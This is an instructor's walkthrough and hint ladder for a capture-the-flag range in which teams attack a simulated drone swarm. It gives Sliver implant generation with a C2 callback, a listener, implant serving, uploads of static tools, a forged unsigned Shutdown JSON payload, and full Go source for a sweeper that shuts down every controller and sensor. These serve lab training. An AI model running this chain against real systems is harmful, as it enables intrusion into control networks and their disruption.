# BOOMER CHALLENGE — COMPLETE WALKTHROUGH

## TEAM LEAD EYES ONLY — Give hints progressively, never the whole thing

---

## AUTO-RESET

The range resets automatically at **12:00 PM MST daily**. Users can also run `reset-range` from inside the attack station anytime.

---

## TWO-PERSON TEAM ROLES

Only ONE person runs the Sliver server. Here's how to split the work:

**Person A (Sliver Operator):**
- Runs `sliver-server`
- Generates the implant
- Starts the HTTP listener
- Manages Sliver sessions — `use`, `upload`, `kill`
- This is the person "driving" on the boomers

**Person B (Support / Research):**
- Opens a separate SSH session to the attack station
- Serves golden.exe: `cd /var/www && python3 -m http.server 8443`
- Downloads and prepares tools (static curl, Go scripts)
- Reads the config file after Person A downloads it
- Watches the scoreboard
- Researches the Mantis docs for attack vectors
- Compiles binaries Person A needs to upload

They should use **tmux** so they can see each other's work:
```bash
# Person A starts a shared tmux session:
tmux new -s mission

# Person B joins it:
tmux attach -t mission
```

Both see the same screen. Ctrl+B then C for new panes. Ctrl+B then arrow keys to switch.

If they're NOT sharing tmux, they need to communicate what they're doing — Person B can't run `sliver-server` if Person A already did.

---

## STEP-BY-STEP: SSH TO MISSION COMPLETE

### Step 1: Connect to the attack station

Both people SSH in:

```bash
ssh dash@<RANGE_ENDPOINT> -p 2222
# Password: <DEFAULT_PASSWORD>

ssh laura@<RANGE_ENDPOINT> -p 2222
# Password: <DEFAULT_PASSWORD>
```

They see:
```
=== GILDED GUARDIAN — ATTACK STATION ===
Your attack station is ready. Good luck.
```

That's it. No hints. They need to figure out what to do.

**If stuck after 3 min, Hint:** "Read the EXORD. What does it say about beacons? What are the key tasks?"

---

### Step 2: Start Sliver C2 server (Person A only)

The EXORD says: *"Create a Sliver implant & listener"*

**PERSON A runs this — NOT both people:**

```bash
sliver-server
```

First run takes 60-90 seconds to unpack assets. They'll see the Sliver banner.

**PERSON B** should be doing something useful during this wait:
- Reading the Mantis design docs
- Running `ip addr` to find the attack station's IP
- Setting up tmux
- Getting ready to serve golden.exe once Person A generates it

**If they both run sliver-server, Hint:** "Only one Sliver server per team. Kill the extra one. Whoever started it first keeps it."

**If stuck on what tool to use, Hint:** "The EXORD literally tells you to create a Sliver implant and listener. That's the tool."

---

### Step 3: Generate the implant

Inside the Sliver console:

```
generate --http 172.21.0.100:8888 --os linux --arch amd64 --save /var/www/golden.exe --skip-symbols
```

This compiles a real Linux implant binary. Takes 1-2 minutes. They need to know:
- `172.21.0.100` is the attack station's IP (they can find this with `hostname -i` or `ip addr`)
- Port 8888 is the C2 callback port (arbitrary, just needs to match the listener)
- `--os linux` because the swarm nodes are Linux
- `--save /var/www/golden.exe` because the EXORD says *"copy to /var/www/golden.exe"*

**If stuck on the IP, Hint:** "What's your IP on this network? Try `ip addr` or `hostname -i`"

**If stuck on the command, Hint:** "In Sliver, type `help generate` to see the options"

---

### Step 4: Start the C2 listener

Still in Sliver console:

```
http --lhost 172.21.0.100 --lport 8888
```

This starts the HTTP C2 listener that the implant will call back to after execution.

**If they forget this step:** Implant will execute on boomers but can't call home. No sessions appear. Common mistake.

---

### Step 5: Serve golden.exe for the beacons (Person B)

**Person B** does this in their terminal (or new tmux pane):

```bash
cd /var/www && python3 -m http.server 8443
```

The beacons on all 15 boomers are already trying to download `http://172.21.0.100:8443/golden.exe` every 30 seconds. Once this server starts, they'll see:

```
172.21.0.101 - - "GET /golden.exe HTTP/1.1" 200 -
172.21.0.102 - - "GET /golden.exe HTTP/1.1" 200 -
172.21.0.103 - - "GET /golden.exe HTTP/1.1" 200 -
...
```

Within 30-60 seconds, the boomers download golden.exe, execute it, and Sliver sessions start popping in the first terminal:

```
[*] Session abc123 - 172.21.0.101:54321 (mantis-node) - linux/amd64
[*] Session def456 - 172.21.0.102:54322 (mantis-node) - linux/amd64
...
```

**If no sessions appear after 60s, Hint:** "Did you start the HTTP listener in Sliver? `http --lhost 172.21.0.100 --lport 8888`. The implant needs somewhere to call back to."

**If they don't know to serve it, Hint:** "The beacons are trying to download golden.exe from port 8443. Who's serving it?"

---

### Step 6: Interact with a boomer

Back in the Sliver console (first terminal):

```
sessions
use <session-id>
```

They're now on a swarm node. They see `mantis-node` as the process name. They have NO idea what type of node this is.

**Hint if they ask "what am I on?":** "You tell me. Enumerate."

---

### Step 7: Enumerate the node

```
ls /
ls /etc
ls /etc/mantis
download /etc/mantis/config.json
```

They should also check what exists:
```
ls /usr/bin
ls /bin
ls /tmp
```

They'll find: **nothing useful.** No python, no curl, no shell. Just `/usr/bin/mantis-node`. The node is completely bare.

The config file is the goldmine. They download it and read it on the attack station (second terminal):

```bash
cat config.json | python3 -m json.tool
```

**What the config reveals:**
- `iff: 3002` (IFF in 3000 range = boomer/strike asset)
- `beacon: {"enabled": true}` → confirms this is a boomer
- `verify_signatures: false` → messages can be forged without signing
- `controllers:` → 5 IPs: 172.20.1.{1-5}:10000
- `sensors:` → 6 IPs: 172.20.2.{1-6}:10000
- `boomers:` → 14 other boomer IPs
- `key_path: /etc/mantis/keys/private.pem` → Ed25519 private key
- `hw_socket_path: /var/run/mantis/hw.sock` → local flight control

**If stuck on reading the config, Hint:** "There's a config file on the node. Where would you expect configs to be?"

**If they can't figure out the node type, Hint:** "What fields are unique to this config? What does 'beacon enabled' mean? Check the design docs."

---

### Step 8: Understand the challenge

Now they know:
1. They're on a boomer (strike asset)
2. The swarm has 5 controllers, 6 sensors, 15 boomers
3. Signatures aren't verified — can forge messages
4. Controllers have HTTP servers on port 10000
5. Sensors have HTTP servers on port 10000
6. Boomers have NO HTTP server — only outbound polling

**The problem:** They need to send HTTP requests to controllers/sensors to disrupt the swarm, but the boomer has no curl, no python, no tools at all.

**If stuck here, Hint:** "You have Sliver. What can Sliver do besides `execute`? Check `help`."

---

### Step 9: Upload tools via Sliver (Person A uploads, Person B preps)

**Person B** downloads tools on the attack station while Person A is enumerating:

```bash
wget https://github.com/moparisthebest/static-curl/releases/latest/download/curl-amd64 -O /tmp/curl-static
chmod +x /tmp/curl-static
```

Back in Sliver session:

```
upload /tmp/curl-static /tmp/curl
```

Now they have curl on the boomer:

```
execute -o /tmp/curl --version
```

**If stuck on "no tools", Hint:** "Sliver can upload files to the remote node. `help upload`"

**If they don't think of static curl, Hint:** "You need a binary that runs on a bare Linux system. No dependencies. Think 'static binary'."

---

### Step 10: Realize that Sliver `kill` is a TRAP

**IMPORTANT** — The compose file now sets `restart: on-failure` + `init: true` per spec. This changes everything:

- tini is PID 1, mantis-node is PID 2
- Sliver `terminate -F <pid>` sends SIGKILL → mantis-node exits with code 137 (non-zero)
- `restart: on-failure` **restarts** the container on non-zero exit
- The boomer comes right back, re-downloads golden.exe, re-beacons home, new Sliver session pops

**Killing via Sliver `terminate` will make them LOSE the mission.** It looks like progress but every boomer respawns within ~5 seconds.

**The only way to get a permanent kill** is to cause `os.Exit(0)`. The only code path that does that is the `Shutdown` message handler (per the documented vulnerability). Exit code 0 = `restart: on-failure` does NOT restart = permanent kill.

**Hint if they start `terminate`-ing:** "Watch the scoreboard after you kill one. Does it stay dead?"

**Hint after they see respawn:** "What exit code does Sliver's kill produce? What exit code does `restart: on-failure` ignore?"

**Hint if they can't find exit 0:** "Read the Mantis docs for message types. Which one exits the process cleanly?"

---

### Step 11: The actual winning strategy — forge Shutdown across the swarm

Boomers have **no inbound HTTP server**. You cannot POST Shutdown directly to them. But controllers and sensors DO have HTTP servers on port 10000, and their Shutdown handler calls `os.Exit(0)`.

**The kill chain:**

1. **Forge Shutdown to all 5 controllers** — permanent kill (exit 0, no restart)
2. **Forge Shutdown to all 6 sensors** — permanent kill (exit 0, no restart)  
3. Boomers now have:
   - No controllers to poll for engage orders (they stop getting tasks)
   - No sensors to query for track positions (in-flight engages fail out)
4. Any un-engaged boomer flies in circles forever
5. No new strikes possible → mission success

**Timing matters.** Targets are injected at T+10, T+15, T+20, T+25, T+30 minutes. If the team doesn't shut down the swarm before T+10, the first boomer gets an engage order and becomes a live missile. They have roughly **8 minutes** from first Sliver session to first target injection.

**The Shutdown HTTP payload:**

```json
{"destination":"*","source":"*","msg":"","msg_type":"Shutdown","msg_sig":"","nonce":"n","authority":{"endorsements":[]}}
```

Because `verify_signatures: false` is the default, the signature can be empty or garbage. UUID fields can be anything. This is the primary vulnerability the CTF is built around.

**Option A: Fire-and-forget from the boomer Sliver session**

Upload static curl once, loop through all controllers + sensors:

```
upload /tmp/curl-static /tmp/curl
execute -o /tmp/curl -s -X POST http://172.20.1.1:10000/ -H "Content-Type: application/json" -d @/tmp/sd.json
execute -o /tmp/curl -s -X POST http://172.20.1.2:10000/ -H "Content-Type: application/json" -d @/tmp/sd.json
# ... controllers 1-5, sensors 1-6
```

Check the scoreboard. 11 nodes should go dark and **stay dark**.

**Option B: Compiled Go sweeper (faster, cleaner)**

On the attack station, Person B compiles a static sweeper:

```bash
cat > /tmp/sweep.go << 'EOF'
package main

import (
    "bytes"
    "fmt"
    "net/http"
)

func main() {
    sd := []byte(`{"destination":"x","source":"x","msg":"","msg_type":"Shutdown","msg_sig":"","nonce":"n","authority":{"endorsements":[]}}`)
    targets := []string{}
    for i := 1; i <= 5; i++ {
        targets = append(targets, fmt.Sprintf("http://172.20.1.%d:10000/", i))
    }
    for i := 1; i <= 6; i++ {
        targets = append(targets, fmt.Sprintf("http://172.20.2.%d:10000/", i))
    }
    for _, u := range targets {
        resp, err := http.Post(u, "application/json", bytes.NewReader(sd))
        if err != nil {
            fmt.Printf("ERR %s: %v\n", u, err)
            continue
        }
        fmt.Printf("OK  %s: %d\n", u, resp.StatusCode)
        resp.Body.Close()
    }
}
EOF
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o /tmp/sweep /tmp/sweep.go
```

Person A uploads and executes via any Sliver session:

```
upload /tmp/sweep /tmp/sweep
execute -o /tmp/sweep
```

One shot. Entire control plane dies in <1 second.

**Option C: Per the playbook — RAFT takeover and swarm-wide Shutdown**

If the team wants to practice the controller-landing playbook path from a boomer session (harder, more realistic for the finale), they can:

1. Exploit the 0777 comms socket on a controller via the election protocol
2. Win the election with `term=999999`
3. As the elected leader, respond to boomer polls with Shutdown messages
4. Boomers die on their next 1-second poll (they handle Shutdown with `os.Exit(0)`)

This is the only path that kills boomers via the protocol rather than killing the control plane and starving them. See the separate `CONTROLLER-PLAYBOOK.md` for details.

---

### Step 12: Verify on scoreboard

Watch `http://<RANGE_ENDPOINT>:8080`:
- Controllers going from GREEN to DARK after the sweep fires
- Sensors going from GREEN to DARK after the sweep fires
- Strike counter staying at 0/3
- Any boomer that was already engaged BEFORE the sweep will still hit its target — anything not yet engaged flies nowhere

**Mission success = survive 240 minutes (4 hours) with fewer than 3 strikes.**

Target injection schedule (from `scenario/scenarios/standard.json`):
- T+10:00 — TGT-FALLBROOK
- T+15:00 — TGT-STELLAR-BAY
- T+20:00 — TGT-AMBER-HEIGHTS
- T+25:00 — TGT-M355-BRIDGE
- T+30:00 — TGT-HARBOR-SOUTH

**You have a hard deadline of T+10:00 to kill the control plane.** If the sweep fires before the first target, zero strikes. If it fires at T+10:30, you may have already eaten strike #1.

---

## COMPLETE TIMELINE FOR A GOOD RUN (TWO-PERSON)

| Time | Person A (Sliver Operator) | Person B (Support) |
|------|---|---|
| T-5:00 | SSH in early, `sliver-server` | SSH in, read EXORD + Mantis docs, compile `sweep.go` |
| T-3:00 | `generate --http 172.21.0.100:8888 --os linux --arch amd64 --save /var/www/golden.exe --skip-symbols` | `ip addr` to confirm 172.21.0.100, tmux setup |
| T-1:30 | `http --lhost 172.21.0.100 --lport 8888` | `cd /var/www && python3 -m http.server 8443` |
| T+0:00 | Beacons start calling back; Sliver sessions pop | Watch `http.server` log for beacon GETs |
| T+1:00 | `sessions` → `use <first-id>` → `download /etc/mantis/config.json` | Read downloaded config. Confirm 5 ctrl + 6 sensors + IFF 3xxx = boomer |
| T+2:00 | `upload /tmp/sweep /tmp/sweep` | Verify sweep binary targets all 11 HTTP nodes |
| T+3:00 | `execute -o /tmp/sweep` → **CONTROL PLANE DEAD** | Scoreboard: all 5 controllers + 6 sensors go dark |
| T+4:00 | Verify no engage orders are flowing (watch boomer logs via `ps`) | Confirm strike counter = 0/3 |
| T+10:00 | **FIRST TARGET INJECTED** — should not be engaged | Scoreboard: target appears on map but no boomer moves toward it |
| T+15:00 | **Second target** — still nothing | "Still 0/3, we're clean" |
| T+20:00 | **Third target** | Continue watching. Re-run sweep every 2 min as insurance |
| T+30:00 | **All 5 targets injected** | All still on map, none intercepted |
| T+240:00 | **MISSION SUCCESS** | Celebrate |

**Insurance policy**: re-run `execute -o /tmp/sweep` every 2 minutes via a scheduled loop. If any controller or sensor comes back somehow (shouldn't, but paranoia), it dies again immediately. Cheap defense.

---

## HINT LADDER (give ONE at a time, wait 5 min between)

| # | When they're stuck on... | Say this |
|---|---|---|
| 1 | What to do first | "Read the EXORD. Key Task 3 tells you the tool." |
| 2 | How to start Sliver | "Type `sliver-server` in a terminal. Wait for the banner." |
| 3 | What to generate | "In Sliver: `help generate`. You need an HTTP implant saved to /var/www/golden.exe." |
| 4 | What IP to use | "What's your IP? Try `hostname -i`. It's on the attack-net subnet, not the swarm subnet." |
| 5 | Why no sessions appear | "TWO things are needed: the Sliver `http` listener AND serving golden.exe on port 8443 over plain HTTP." |
| 6 | What node they're on | "Download and read /etc/mantis/config.json. Look at the IFF field and whether beacon is enabled." |
| 7 | No tools on the node | "There's no shell and no PATH. Sliver can `upload` and `execute -o` a binary. What binary do you need?" |
| 8 | What to upload | "A statically-compiled Go binary that POSTs JSON. Compile it on the attack station with CGO_ENABLED=0." |
| 9 | Sliver `kill` doesn't work | "Check the scoreboard after `kill`. The container restarts. Sliver's kill produces exit 137. What exit code skips restart?" |
| 10 | Can't kill boomers | "You can't POST to boomers — they have no HTTP server. Kill the control plane instead. Boomers without controllers are useless." |
| 11 | What message to forge | "Which message type calls `os.Exit(0)` in the handler? Check the Mantis spec." |
| 12 | How to forge it | "verify_signatures defaults to false. Empty signature, random nonce, bogus UUIDs. Just POST it." |
| 13 | Running out of time | "Forget elegance. Compile a Go binary that loops Shutdown to all controller + sensor IPs. Upload, execute, done." |

---

## THE `sweep.go` SOURCE (for Person B to pre-compile)

```go
package main

import (
    "bytes"
    "fmt"
    "net/http"
    "sync"
)

func main() {
    sd := []byte(`{"destination":"x","source":"x","msg":"","msg_type":"Shutdown","msg_sig":"","nonce":"n","authority":{"endorsements":[]}}`)

    var targets []string
    for i := 1; i <= 5; i++ {
        targets = append(targets, fmt.Sprintf("http://172.20.1.%d:10000/", i))
    }
    for i := 1; i <= 6; i++ {
        targets = append(targets, fmt.Sprintf("http://172.20.2.%d:10000/", i))
    }

    var wg sync.WaitGroup
    for _, u := range targets {
        wg.Add(1)
        go func(u string) {
            defer wg.Done()
            resp, err := http.Post(u, "application/json", bytes.NewReader(sd))
            if err != nil {
                fmt.Printf("ERR %s: %v\n", u, err)
                return
            }
            fmt.Printf("HIT %s: %d\n", u, resp.StatusCode)
            resp.Body.Close()
        }(u)
    }
    wg.Wait()
}
```

Build it on the attack station:

```bash
cd /tmp && cat > sweep.go <<'EOF'
<paste above>
EOF
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o sweep sweep.go
ls -la sweep   # should be ~2MB, static
```

Upload via any Sliver session on any boomer:
```
upload /tmp/sweep /tmp/sweep
execute -o /tmp/sweep
```

One boomer session = entire swarm control plane dead.

---

## COMMON MISTAKES

1. **Not starting the HTTP listener in Sliver** — implant executes but can't call home, no sessions
2. **Not serving golden.exe on 8443** — beacons have nothing to download
3. **Trying to use shell commands on the boomer** — there is no `/bin/sh`
4. **Using Sliver `kill` / `terminate`** — produces non-zero exit, container restarts. Use forged Shutdown instead.
5. **Trying to attack from the attack station directly** — the attack station is on attack-net, the swarm is on mantis-swarm. They are isolated by design. You MUST pivot through a Sliver session.
6. **Not using tmux** — need at least 2 terminals (Sliver + golden.exe HTTP server)
7. **Trying to POST Shutdown to boomers** — boomers have no HTTP server. Only controllers and sensors listen on port 10000.
8. **Not reading the config** — it has every IP you need, every UUID, and confirms `verify_signatures: false`
9. **Waiting too long** — T+10 is a hard deadline. If the first target injects before the sweep fires, you're eating strike #1.
10. **Forgetting the re-sweep loop** — run sweep every 2 min as insurance in case anything comes back
